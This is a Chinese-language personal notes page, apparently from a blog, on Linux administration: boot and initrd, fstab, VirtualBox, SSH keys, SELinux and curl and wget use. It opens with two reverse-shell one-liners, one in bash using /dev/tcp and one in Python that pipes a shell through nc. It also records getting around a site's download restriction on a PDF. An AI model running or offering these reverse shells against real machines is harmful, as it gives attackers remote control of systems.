    <content type="html"><![CDATA[<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><ul><li>受控机器上执行<code>bash -i /dev/tcp/IP/PORT 0&lt;&amp;1</code> (最后改为<code>0&gt;&amp;1</code>也ok)，入侵者机器提前打开listen socket，可以实现reverse shell</li><li><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)</code>（python代码）也可以</li></ul><h3 id="SIGINT的SIG-DEF"><a href="#SIGINT的SIG-DEF" class="headerlink" title="SIGINT的SIG_DEF"></a>SIGINT的SIG_DEF</h3><ul><li>默认的handler会输出一个换行。</li><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果不<code>kill -2 a.out</code>则不会输出一个空行，如果kill则会</p></li></ul><h3 id="boot过程"><a href="#boot过程" class="headerlink" title="boot过程"></a>boot过程</h3><ul><li>究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector</li><li>我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要<code>initrd    /boot/initrd.img-4.9.0-deepin13-amd64</code>。（我甚至可以在这条命令前去加载一个ntfs的module）。</li><li>既然boot loader 可以加载<code>/boot/</code>目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢</li><li>关于initrd <blockquote><p>The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.<br>Boot-up operation<br>   When booting up with initrd, the system boots as follows:</p><ol><li>The boot loader loads the kernel program and /dev/initrd’s contents into memory.</li><li>On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used<br>by /dev/initrd.</li><li>The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.</li><li>If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the<br>usual boot sequence.</li><li>If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐<br>cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)</li><li>If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted<br>on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li><li>If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does<br>not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐<br>ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when<br>/linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li><li>The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.</li></ol></blockquote></li></ul><h3 id="tab补全失效"><a href="#tab补全失效" class="headerlink" title="tab补全失效"></a>tab补全失效</h3><ul><li>when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够</li><li>this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error</li></ul><h3 id="登录用户管理"><a href="#登录用户管理" class="headerlink" title="登录用户管理"></a>登录用户管理</h3><ul><li><p><code>users</code>或 <code>w</code>查看当前登录的用户</p></li><li><p><code>lsof -iTCP</code> <code>netstat -tunp</code>查看当前的网络连接</p></li><li><p>查看打开的端口</p></li><li><p><code>pkill -kill -t pts/1</code> 踢掉pts/1</p></li><li><p>编辑<code>/etc/hosts.deny</code> ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网)</p><p>格式如下（其实不是非常确定以下是有用的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sshd:218.65.30.43:deny</span><br><span class="line">sshd:58.*.*.*:deny</span><br></pre></td></tr></table></figure></li></ul><h3 id="是否没有listen的socket就无法被入侵？"><a href="#是否没有listen的socket就无法被入侵？" class="headerlink" title="是否没有listen的socket就无法被入侵？"></a>是否没有listen的socket就无法被入侵？</h3><h3 id="wget使用"><a href="#wget使用" class="headerlink" title="wget使用"></a>wget使用</h3><ul><li><code>-r</code>递归下载</li><li><code>-k</code>把下载下来的连接修改为本地地址</li><li><code>-e robots=off</code>不respect<code>robots.txt</code></li><li>或者是 set the <code>robots</code> variable to ‘off’ in your .wgetrc. </li><li><code>--user-agent=&quot;&quot;</code>不添加user-agent头，如果不加上这个，有些网站会返回404</li></ul><h3 id="curl的使用"><a href="#curl的使用" class="headerlink" title="curl的使用"></a>curl的使用</h3><ul><li>curl可以模拟post/get等行为，但是似乎没法递归下载</li></ul><h3 id="axel的使用"><a href="#axel的使用" class="headerlink" title="axel的使用"></a>axel的使用</h3><ul><li><code>-n 100</code>开100个线程</li><li>好像还可以调整缓存，从而减少写入磁盘的次数</li></ul><h3 id="VirtualBox报错“kernel-dirver-not-installed”"><a href="#VirtualBox报错“kernel-dirver-not-installed”" class="headerlink" title="VirtualBox报错“kernel dirver not installed”"></a>VirtualBox报错“kernel dirver not installed”</h3><ul><li>复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装<code>virtualbox-dkms</code>，并运行<code>modprobe vboxdrv</code></li><li><p>在4.17内核尝试</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install virtualbox-dkms</span><br><span class="line">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms</span><br><span class="line">sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p> 都没有解决问题，更严重的，linux-header-4.17也没有</p></li><li>切换到4.15内核没有解决问题。尝试了以上命令无果</li><li><p>删除4.17内核（直接在<code>/boot/</code>运行<code>rm *4.17* -r</code>）后<code>update-grub</code>。然后重启到<code>4.15.0-23-generic</code>并执行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install --fix-missing</span><br><span class="line">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms </span><br><span class="line">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure><p> 解决问题</p></li><li>题外话：删除内核时，<code>dpkg --get-selections | grep linux</code> 没有看到4.17相关的</li></ul><h3 id="删除内核"><a href="#删除内核" class="headerlink" title="删除内核"></a>删除内核</h3><ul><li><code>sudo apt-get remove linux-headers-4.4.0-22</code></li><li>在<code>/boot/</code>目录下删除相关的东西</li></ul><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><ul><li><code>chmod -R 666 test</code>(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）</li><li>给文件夹本身加上x——<code>chmod 777 test</code>就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有<code>x</code>标志</li></ul><h3 id="内核模块加载"><a href="#内核模块加载" class="headerlink" title="内核模块加载"></a>内核模块加载</h3><ul><li><code>modprobe tcp_bbr</code>加载<code>tcp_bbr</code>模块 </li><li>比如，<code>echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf</code>即可实现启动自动加载该模块</li></ul><h3 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h3><ul><li>如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖</li></ul><h3 id="安装centos-md"><a href="#安装centos-md" class="headerlink" title="安装centos.md"></a>安装centos.md</h3><h4 id="联网"><a href="#联网" class="headerlink" title="联网"></a>联网</h4><ul><li><p><a href="http://icyleaf.com/2013/09/network-configuration-in-centos/" target="_blank" rel="noopener">参考资料</a></p></li><li><p>修改<code>/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)</code></p></li><li><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEVICE=eth0</span><br><span class="line">HWADDR=&quot;00:22:19:09:4D:3C&quot;</span><br><span class="line">NM_CONTROLLED=yes</span><br><span class="line">ONBOOT=yes      # 默认是 no，我们要改成 yes</span><br><span class="line">BOOTPROTO=dhcp  # 如果不是这个值也要修改</span><br></pre></td></tr></table></figure></li><li><p>重启network service</p><ul><li>方法一：<code>service network restart</code></li><li>方法二：<code>/etc/init.d/network restart</code></li></ul></li><li><p>vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat</p></li></ul><h4 id="安装图形界面"><a href="#安装图形界面" class="headerlink" title="安装图形界面"></a>安装图形界面</h4><ul><li><a href="https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7" target="_blank" rel="noopener">安装图形界面</a><ul><li><code>yum groupinstall &quot;X Window System&quot;</code></li><li><code>yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts</code></li><li><code>unlink /etc/systemd/system/default.target</code></li><li><code>ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target</code></li></ul></li></ul><h3 id="使用fstab自动挂载"><a href="#使用fstab自动挂载" class="headerlink" title="使用fstab自动挂载"></a>使用fstab自动挂载</h3><h4 id="Deepin"><a href="#Deepin" class="headerlink" title="Deepin"></a>Deepin</h4><ul><li><p>以下是<code>/etc/fstab</code>的内容</p></li><li><p>在<code>Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux</code>正确工作</p></li><li><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># /dev/sda7</span><br><span class="line">UUID=1faa19b8-abfb-44db-b186-5a368498d42b/         ext4      rw,relatime,data=ordered0 1</span><br><span class="line"></span><br><span class="line"># /dev/sda1</span><br><span class="line">UUID=CCCB-BF68      /boot/efi vfat      rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro0 2</span><br><span class="line"></span><br><span class="line"># /dev/sda4</span><br><span class="line">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3none      swap      defaults  0 0</span><br><span class="line"></span><br><span class="line"># /dev/sda5</span><br><span class="line"># UUID=0CADCC32742391F2       /home/hzx/sda5      ntfs defaults0 1</span><br><span class="line">UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda6</span><br><span class="line"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults0 1</span><br><span class="line">UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda3</span><br><span class="line"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults0 1</span><br><span class="line">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa/mnt/deepin-sda3 ext4  defaults  1   2</span><br></pre></td></tr></table></figure></li><li><p>然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把<code>defaults</code>换成<code>nofail</code>还是相反，都没用</p></li><li><p>后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误</p></li></ul><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><ul><li><p>一切正常</p></li><li><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/sda8 during installation</span><br><span class="line">UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1</span><br><span class="line"># /boot/efi was on /dev/sda1 during installation</span><br><span class="line">UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1</span><br><span class="line"># swap was on /dev/sda4 during installation</span><br><span class="line">UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0</span><br><span class="line"># /dev/sda5</span><br><span class="line"># UUID=0CADCC32742391F2       /home/hzx/sda5      ntfs defaults0 1</span><br><span class="line">UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2</span><br><span class="line"># /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda6</span><br><span class="line"># UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults0 1</span><br><span class="line">UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2</span><br><span class="line"></span><br><span class="line"># /dev/sda9</span><br><span class="line">UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2</span><br><span class="line"></span><br><span class="line"># /dev/sda3</span><br><span class="line"># UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults0 1</span><br><span class="line">UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2</span><br></pre></td></tr></table></figure></li></ul><h3 id="mkfs-vfat了sda2那个efi分区结果deepin启动不了"><a href="#mkfs-vfat了sda2那个efi分区结果deepin启动不了" class="headerlink" title="mkfs.vfat了sda2那个efi分区结果deepin启动不了"></a>mkfs.vfat了sda2那个efi分区结果deepin启动不了</h3><ul><li>情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。</li><li>放弃，新装一个deepin 15.6，然后就会自动安装引导。</li><li>搞定后，进原来那个deepin15.5还是失败，查看<code>journalctl -xb</code>，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。</li><li>原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。</li><li>后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M</li></ul><h3 id="编译内核-md"><a href="#编译内核-md" class="headerlink" title="编译内核.md"></a>编译内核.md</h3><h4 id="无openssl-bio-h"><a href="#无openssl-bio-h" class="headerlink" title="无openssl/bio.h"></a>无openssl/bio.h</h4><blockquote><p>编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”</p><p> “ #include &lt;openssl/bio.h&gt;”</p><p>&lt;&lt;<------------------------------------>&gt;&gt;</------------------------------------></p><p>解决方法: [ubuntu 16.10,64位主机]</p><p><code>sudo apt install libssl-dev</code></p></blockquote><h3 id="记一次尝试下载-不允许下载的sinacloud的pdf"><a href="#记一次尝试下载-不允许下载的sinacloud的pdf" class="headerlink" title="记一次尝试下载 不允许下载的sinacloud的pdf"></a>记一次尝试下载 不允许下载的sinacloud的pdf</h3><ul><li><p>获得页面源代码</p></li><li><p>在html搜索字符串next从而定位到逻辑代码</p></li><li><p>然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本</p></li><li><p>然后去chrome控制台使用以下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    script.innerHTML = <span class="string">"console.log(closePay)"</span><span class="comment">//括号内是要获得的函数名称;</span></span><br><span class="line">    <span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></li><li><p>然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败</p></li><li><p>直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）</p></li><li><p>查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice</p></li></ul><h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//request head</span><br><span class="line">http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=6020439-6389345</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: sinacloud.net</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh;q=0.9,zh-CN;q=0.8</span><br><span class="line"></span><br><span class="line">//从chrome复制的curl命令</span><br><span class="line">curl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&amp;KID=sina%2CSAE0000000W1W2NYLKW2&amp;ssig=K74aTt3a0F&amp;range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed</span><br></pre></td></tr></table></figure><h3 id="查找并删除特定文件-md"><a href="#查找并删除特定文件-md" class="headerlink" title="查找并删除特定文件.md"></a>查找并删除特定文件.md</h3><p><a href="https://www.cnblogs.com/langzou/p/5959940.html" target="_blank" rel="noopener">来源</a><br>linux命令每日一练<br>linux中find与rm实现查找并删除目录或文件</p><p>linux 下用find命令查找文件，rm命令删除文件。</p><p>删除指定目录下指定文件<br>find 要查找的目录名 -name .svn |xargs rm -rf</p><p>删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r</p><p>分析：<br>find -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录<br>| xargs rm -r 执行删除指令</p><p>删除目录下所有exe文件</p><p>find . -name ‘*.exe’ -type f -print -exec rm -rf {} ;</p><p>(1) “.” 表示从当前目录开始递归查找</p><p>(2) “ -name ‘*.exe’ “根据名称来查找，要查找所有以.exe结尾的文件夹或者文件</p><p>(3) “ -type f “查找的类型为文件</p><p>(4) “-print” 输出查找的文件目录名</p><p>(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。<br>exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号</p><h3 id="VPS上部署hexo"><a href="#VPS上部署hexo" class="headerlink" title="VPS上部署hexo"></a>VPS上部署hexo</h3><ul><li><p><a href="https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/" target="_blank" rel="noopener">参考文章</a></p></li><li><p>遇到nginx 403，然后就关闭selinux</p><blockquote><p>1、临时关闭<br>setenforce 0 #设置SELinux 成为permissive模式</p><h5 id="setenforce-1-设置SELinux-成为enforcing模式"><a href="#setenforce-1-设置SELinux-成为enforcing模式" class="headerlink" title="setenforce 1 设置SELinux 成为enforcing模式"></a>setenforce 1 设置SELinux 成为enforcing模式</h5><p>2、修改配置文件需要重启机器：</p><p>修改/etc/selinux/config 文件</p><p>将SELINUX=enforcing改为SELINUX=disabled</p><p>重启机器即可</p></blockquote></li></ul><h3 id="搭建ss服务器"><a href="#搭建ss服务器" class="headerlink" title="搭建ss服务器"></a>搭建ss服务器</h3><ul><li>vps开了进程</li><li>本地主机也如此</li><li>但是提示[Errno 113] No route to host</li><li>实在搞不明白——22端口可以用scp发文件过去vps</li><li>所以用py写了个tcpclient、tcpserver，然后一运行也如此提示</li><li>所以在vps运行<code>service firewalld stop</code></li><li>其他关闭服务器防火墙的方法都不起作用，不知道问什么</li></ul><h3 id="VLC字幕"><a href="#VLC字幕" class="headerlink" title="VLC字幕"></a>VLC字幕</h3><p><a href="http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html" target="_blank" rel="noopener">链接</a></p><h3 id="vbox的win7虚拟机无法使用usb"><a href="#vbox的win7虚拟机无法使用usb" class="headerlink" title="vbox的win7虚拟机无法使用usb"></a>vbox的win7虚拟机无法使用usb</h3><ul><li><a href="https://blog.csdn.net/harry_helei/article/details/46972125" target="_blank" rel="noopener">引用自</a></li><li>安装Virtualbox Extension Pack</li><li>用户权限添加<ul><li>添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）<code>sudo groupadd usbfs</code>   </li><li>将你的linux常用用户添加到vboxusers、usbfs这个两个组中<code>sudo adduser kuein vboxusers</code>  <code>sudo adduser kuein usbfs</code> </li><li>重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。</li></ul></li></ul><h3 id="Gnome-configure-md"><a href="#Gnome-configure-md" class="headerlink" title="Gnome-configure.md"></a>Gnome-configure.md</h3><h3 id="hide-title-bar"><a href="#hide-title-bar" class="headerlink" title="hide title bar"></a>hide title bar</h3><p><a href="https://extensions.gnome.org/extension/1267/no-title-bar/" target="_blank" rel="noopener">no-title-bar-extention</a></p><h3 id="SSH-md"><a href="#SSH-md" class="headerlink" title="SSH.md"></a>SSH.md</h3><h4 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h4><ul><li>本地用<code>ssh-keygen</code>生成一个秘钥——可以自定义储存的文件名</li><li>把<code>id_rsa.pub</code>传送到vps上，<code>cat id_rsa.pug &gt; ~/.ssh/authorized_keys</code>，注意，这个命令会覆盖原有的<code>authorized_keys</code>内容</li></ul><h4 id="本地配置VPS别名"><a href="#本地配置VPS别名" class="headerlink" title="本地配置VPS别名"></a>本地配置VPS别名</h4><ul><li><p>代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; ~/.ssh/config &lt;&lt;EOF</span><br><span class="line">Host VultrVPS</span><br><span class="line">    User root</span><br><span class="line">    Hostname 217.163.11.0</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/VultrVPS_rsa</span><br><span class="line">    Port 22</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li><li><p>以上可实现使用秘钥 ，多个VPS可以依次增加配置</p></li></ul><h3 id="Linux安装-md"><a href="#Linux安装-md" class="headerlink" title="Linux安装.md"></a>Linux安装.md</h3><h4 id="硬盘安装deepin"><a href="#硬盘安装deepin" class="headerlink" title="硬盘安装deepin"></a>硬盘安装deepin</h4><ul><li><a href="http://bbs.iaixue.com/forum.php?mod=viewthread&amp;tid=1812" target="_blank" rel="noopener">来源</a></li></ul><blockquote><p>将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">menuentry &quot;UEFI Deepin 15.4 Linux ISO live&quot; --class deepin --class gnu-linux --class gnu --class os&#123;</span><br><span class="line">        echo &apos;booting...&apos;</span><br><span class="line">        set isofile=/deepin-15.5-amd64.iso</span><br><span class="line">        search --file $isofile --set=root</span><br><span class="line">        loopback loop $isofile</span><br><span class="line">        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync</span><br><span class="line">        initrd (loop)/live/initrd.lz</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="刻录U盘安装Fedora或Centos"><a href="#刻录U盘安装Fedora或Centos" class="headerlink" title="刻录U盘安装Fedora或Centos"></a>刻录U盘安装Fedora或Centos</h4><ul><li>win下使用PowerISO刻录</li><li>使用简单的dd命令<code>dd if=xxx of=xxx bs=xx</code>失败</li><li>使用Ultraiso失败</li></ul><h4 id="U盘grub引导多个linux镜像安装"><a href="#U盘grub引导多个linux镜像安装" class="headerlink" title="U盘grub引导多个linux镜像安装"></a>U盘grub引导多个linux镜像安装</h4><ul><li><a href="https://my.oschina.net/abcfy2/blog/491140" target="_blank" rel="noopener">U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式</a>。文中提供的deepin的那个grub配置无效</li><li><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=150783" target="_blank" 